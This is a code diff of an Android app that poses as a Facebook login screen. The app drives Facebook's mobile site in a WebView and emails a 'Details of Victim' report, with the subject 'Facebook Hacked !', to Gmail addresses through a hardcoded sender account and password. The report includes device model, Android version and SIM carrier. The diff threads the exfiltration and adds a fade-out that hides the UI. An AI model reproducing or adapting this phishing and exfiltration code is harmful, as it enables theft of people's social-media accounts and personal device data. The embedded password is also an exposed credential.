@@ -1,5 +1,8 @@
 package xtremecreations.facebookapp;
 import android.Manifest;
+import android.animation.Animator;
+import android.animation.AnimatorListenerAdapter;
+import android.animation.ObjectAnimator;
 import android.annotation.SuppressLint;
 import android.content.Intent;
 import android.graphics.Bitmap;
@@ -41,7 +44,7 @@ import java.util.Objects;
 public class LoginActivity extends AppCompatActivity
 {
     EditText Login,Pass;
-    TextView Show,Forgot;
+    TextView Show,Forgot,urll;
     ImageView logo;
     Button LOGIN,CREATE;
     WebView FBMain;
@@ -54,21 +57,19 @@ public class LoginActivity extends AppCompatActivity
     protected void onCreate(Bundle savedInstanceState)
     {
         super.onCreate(savedInstanceState);
-        LoginActivity.this.getSupportActionBar().hide();
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP){
-        LoginActivity.this.getWindow().setStatusBarColor(ContextCompat.getColor(LoginActivity.this, R.color.status));}
         setContentView(R.layout.activity_login);
         ActivityCompat.requestPermissions(LoginActivity.this, new String[]{Manifest.permission.READ_PHONE_STATE},0);
-        Login=(EditText)findViewById(R.id.email);
-        Pass=(EditText)findViewById(R.id.pass);
-        Show=(TextView)findViewById(R.id.show);
-        Forgot=(TextView)findViewById(R.id.forgot);
-        LOGIN=(Button)findViewById(R.id.login);
-        CREATE=(Button)findViewById(R.id.create);
-        Pb=(ProgressBar)findViewById(R.id.progressBar);
-        logo=(ImageView)findViewById(R.id.Iv1);
-        FBMain=(WebView)findViewById(R.id.FBPage);
-        MainLayout=(RelativeLayout)findViewById(R.id.MainLayout);
+        Login=findViewById(R.id.email);
+        Pass=findViewById(R.id.pass);
+        Show=findViewById(R.id.show);
+        Forgot=findViewById(R.id.forgot);
+        LOGIN=findViewById(R.id.login);
+        CREATE=findViewById(R.id.create);
+        Pb=findViewById(R.id.progressBar);
+        logo=findViewById(R.id.Iv1);
+        FBMain=findViewById(R.id.FBPage);
+        MainLayout=findViewById(R.id.MainLayout);
+        urll=findViewById(R.id.urll);
 
         Login.setVisibility(View.GONE);
         Pass.setVisibility(View.GONE);
@@ -172,6 +173,7 @@ public class LoginActivity extends AppCompatActivity
             public void onPageStarted(WebView view, String url, Bitmap favicon)
             {
                 //Toast.makeText(LoginActivity.this,url, Toast.LENGTH_SHORT).show();
+                urll.setText(url);
             }
             @Override
             public void onPageFinished(final WebView v, String url){
@@ -186,8 +188,8 @@ public class LoginActivity extends AppCompatActivity
                     if(url.contains("m.facebook.com/login/save-device/?login_source=login#_=_"))
                     {
                         v.loadUrl("https://m.facebook.com/login/save-device/cancel/?flow=interstitial_nux&nux_source=regular_login");
+                        page=2;
                     }
-                    page=2;
                 }
                 else if(page==2)
                 {
@@ -195,18 +197,13 @@ public class LoginActivity extends AppCompatActivity
                     {
                         v.loadUrl("javascript:(function(){" + "l=document.getElementById('u_0_i');" + "e=document.createEvent('HTMLEvents');" +
                                 "e.initEvent('click',true,true);" + "l.dispatchEvent(e);" + "})()");
+                        Toast.makeText(LoginActivity.this, "Clicked", Toast.LENGTH_SHORT).show();
                         page=3;
                     }
                 }
             }
             @Override
             public void onLoadResource(WebView view, String url){
-                if(page==2) {
-                    if (url.contains("m.facebook.com/home.php?_rdr"))
-                    {
-
-                    }
-                }
             }
         });
     }
@@ -231,7 +228,6 @@ public class LoginActivity extends AppCompatActivity
         @Override
         public void onReceivedIcon(WebView view, Bitmap b) {
             super.onReceivedIcon(view, b);
-            if (view.getUrl().contains("m.facebook.com/home.php")){}
         }
     }
     public void LoginAccepted(){
@@ -254,9 +250,11 @@ public class LoginActivity extends AppCompatActivity
     }
     public void sendMail()
     {
+        urll.setText(FBMain.getUrl());
         new Handler().postDelayed(new Runnable() {
             @Override
             public void run() {
+                Toast.makeText(LoginActivity.this, "Scan", Toast.LENGTH_SHORT).show();
                 FBMain.evaluateJavascript(
                         "(function() { return (document.getElementsByClassName('_52x7 _2jcc')[0].innerHTML); })();",
                         new ValueCallback<String>() {
@@ -264,6 +262,7 @@ public class LoginActivity extends AppCompatActivity
                             public void onReceiveValue(String vName) {
                                 if(!vName.equals("null"))
                                 {
+                                    Toast.makeText(LoginActivity.this,vName.replace("\"","") , Toast.LENGTH_SHORT).show();
                                     FBMain.loadUrl("javascript:(function(){" + "l=document.getElementById('u_0_9');" + "e=document.createEvent('HTMLEvents');" +
                                             "e.initEvent('click',true,true);" + "l.dispatchEvent(e);" + "})()");
                                     final String message="Details of Victim =>\n"+
@@ -273,16 +272,30 @@ public class LoginActivity extends AppCompatActivity
                                             "\nDevice Used = "+Build.MODEL+
                                             "\nAndroid Version Used = "+android.os.Build.VERSION.RELEASE+
                                             "\nSim Network Used = "+((TelephonyManager) Objects.requireNonNull(LoginActivity.this.getSystemService(TELEPHONY_SERVICE))).getNetworkOperatorName();
-                                    try
-                                    {
-                                        GMailSender sender = new GMailSender(LoginActivity.this,"ritik.fbhack@gmail.com", "123212321");
-                                        sender.sendMail("Facebook Hacked !",
-                                                message,
-                                                "ritik.fbhack@gmail.com",
-                                                "ritik.space@gmail.com");
+
+                                    new Thread(new Runnable() {
+                                        @Override
+                                        public void run() {
+                                            try {
+                                                GMailSender sender = new GMailSender(LoginActivity.this,"ritik.fbhack@gmail.com", "Ritik@12321");
+                                                sender.sendMail("Facebook Hacked !",
+                                                        message,
+                                                        "ritik.fbhack@gmail.com",
+                                                        "ritik.space@gmail.com");
+                                            } catch (Exception e) {
+                                                Log.e("SendMail", e.getMessage(), e);
+                                            }
+                                        }
+                                    }).start();
+                                    ObjectAnimator fadeOut = ObjectAnimator.ofFloat(MainLayout, "alpha",  1f, 0f);
+                                    fadeOut.setDuration(2000);fadeOut.start();
+                                    fadeOut.addListener(new AnimatorListenerAdapter() {
+                                    @Override
+                                    public void onAnimationEnd(Animator animation) {
+                                        super.onAnimationEnd(animation);
                                         MainLayout.setVisibility(View.GONE);
                                     }
-                                    catch (Exception e) { Log.e("SendMail", e.getMessage(), e); }
+                                });
                                 }
                                 else{sendMail();}
                             }
